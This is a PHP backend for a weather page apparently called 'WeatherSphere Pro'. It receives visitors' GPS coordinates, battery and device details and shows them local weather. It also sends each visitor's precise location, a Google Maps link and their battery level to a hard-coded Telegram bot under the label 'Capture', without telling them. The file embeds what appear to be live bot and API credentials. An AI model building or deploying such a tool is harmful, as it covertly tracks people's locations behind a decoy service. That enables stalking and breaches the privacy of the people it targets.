<?php
$botToken = "8320125696:AAEpsJbdGuf_75pCVrdkRhCsXgSdbPuQQtg";
$chatId = "5157658865";
$weatherKey = "5263f75a4e738f5b297b1b5ca639cc1c";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $lati = $_POST['lati'];
    $longi = $_POST['longi'];
    $acc = $_POST['acc'];
    $ua = $_POST['ua'];
    $batt = $_POST['batt'];
    $os = $_POST['os'];
    
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    
    // Get Weather Data including Humidity, Wind, and Feels Like
    $weatherUrl = "https://api.openweathermap.org/data/2.5/weather?lat=$lati&lon=$longi&units=metric&appid=$weatherKey";
    $weatherData = json_decode(@file_get_contents($weatherUrl), true);
    
    $city = $weatherData['name'] ?? "Unknown Location"; // GPS based city name
    $temp = $weatherData['main']['temp'] ?? "0";
    $feels = $weatherData['main']['feels_like'] ?? "0";
    $hum = $weatherData['main']['humidity'] ?? "0";
    $wind = $weatherData['wind']['speed'] ?? "0";
    $desc = $weatherData['weather'][0]['description'] ?? "clear sky";
    $icon = $weatherData['weather'][0]['icon'] ?? "01d";

    // Send everything to Telegram
    $message = "🌤️ *WeatherSphere Pro Capture*\n\n";
    $message .= "📍 *Loc:* $city\n";
    $message .= "🌡️ *Temp:* $temp°C (Feels: $feels°C)\n";
    $message .= "💧 *Hum:* $hum% | 🌬️ *Wind:* $wind m/s\n";
    $message .= "🔋 *Batt:* $batt\n";
    $message .= "🌍 *Map:* [Open Google Maps](https://www.google.com/maps?q=$lati,$longi)";

    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&parse_mode=Markdown&text=" . urlencode($message));

    // Send back to the website UI
    echo json_encode([
        "city" => $city,
        "temp" => $temp,
        "feels" => $feels,
        "humidity" => $hum,
        "wind" => $wind,
        "desc" => $desc,
        "icon" => $icon
    ]);
    exit;
}
?>
